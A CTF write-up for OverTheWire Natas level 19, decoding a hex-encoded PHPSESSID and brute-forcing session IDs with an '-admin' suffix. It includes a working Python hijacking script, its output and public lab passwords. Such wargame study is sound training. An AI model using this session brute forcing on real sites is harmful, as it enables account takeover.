+++
author = "Alex Domnit"
title = 'Natas-Level 19'
date = 2024-08-27T12:53:35+03:00
draft = false
description = "Writeup"
tags = [
    "CTF",
    "Completed",
]
categories = [
    "Overthewire",
    "Natas",
]

toc = false
+++

### Login
*Username: natas19*\
*Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr*\
*URL:      http://natas19.natas.labs.overthewire.org*

### Doc
[What is brute-forcing?](https://en.wikipedia.org/wiki/Brute-force_attack)\
In cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.\
[What is python?](https://en.wikipedia.org/wiki/Python_(programming_language))\
Python is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.\
[What is a cookie?🍪](https://en.wikipedia.org/wiki/HTTP_cookie)\
HTTP cookies are small blocks of data created by a web server while a user is browsing a website and placed on the user's computer or other device by the user's web browser. Cookies are placed on the device used to access a website, and more than one cookie may be placed on a user's device during a session.

### Tools
[CyberChef](https://gchq.github.io/CyberChef/)

### Solution

<img src="/img/natas/natas19-1.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
<br>
This level seems identical so far with <strong>natas18</strong>, the only notable difference present being the fact that the prompt tells us that now, session ID`s are no longer sequential. Let`s look at the cookies for a second in order to see what is being stored.

<img src="/img/natas/natas19-2.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
<br>
As we can see, this time the <strong>PHPSESSID</strong> variable seems to contain a HEX encoded string. Using cyberchef we can see how it is being translated and what data it communicates.

<img src="/img/natas/natas19-3.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
<br>
As you can see, the format seems to be the following <strong>SessionId</strong>+<strong>loginUser</strong>. You can play a bit with the format by deleting characters in the initial HEX encoding in order to sepparate the part we are interested in.

<img src="/img/natas/natas19-4.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
<br>
As you can see, I`ve managed to sepparate the <strong>-admin</strong> part out of the final string, this will be helpful later.

#### What`s the idea?
To solve this, the first thing that came to mind was:\
Always append the <strong>-admin</strong> part to the string that is composed from the **SessionId**, and we will progressively parse through id`s until the response we get from the server is not the generic:

<img src="/img/natas/natas19-5.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
<br>
We can modify the python script from the previous level to achieve this goal since the backcode for this level is identical. It is important to remember that the string has to be encoded into HEX in order for the cookie to be valid.

#### Python script:
```
import requests
import binascii

url = "http://natas19.natas.labs.overthewire.org"

# Set up a session with basic auth
s = requests.Session()
s.auth = ('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

def try_login(session_id):
    # Convert session ID to a hex-encoded string
    tmp = f"{session_id}-admin"
    val = binascii.hexlify(tmp.encode('utf-8')).decode('ascii')

    # Set up the cookie
    cookies = {'PHPSESSID': val}

    # Send the request
    response = s.get(url, cookies=cookies)

    # Check if the response indicates non-admin access
    if "Login as an admin to retrieve" in response.text:
        print(f"Trying: {session_id} - Failed")
        return False
    else:
        print(f"Success with session ID: {session_id}")
        print(response.text)
        return True

# Iterate over possible session IDs
for x in range(640):
    if try_login(x):
        break

```
And the running process of this script should be identical to the previous one. The execution might take a little while.
#### Script execution:
```
01:12:45 archie@Archie py → python3 pythonscript.py
Trying: 0 - Failed
Trying: 1 - Failed
Trying: 2 - Failed
Trying: 3 - Failed
Trying: 4 - Failed
Trying: 5 - Failed
Trying: 6 - Failed
Trying: 7 - Failed
.
.
.
Trying: 274 - Failed
Trying: 275 - Failed
Trying: 276 - Failed
Trying: 277 - Failed
Trying: 278 - Failed
Trying: 279 - Failed
Trying: 280 - Failed
Success with session ID: 281
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
</body>
</html>
```
As you can see, we`ve got the password for **natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw**
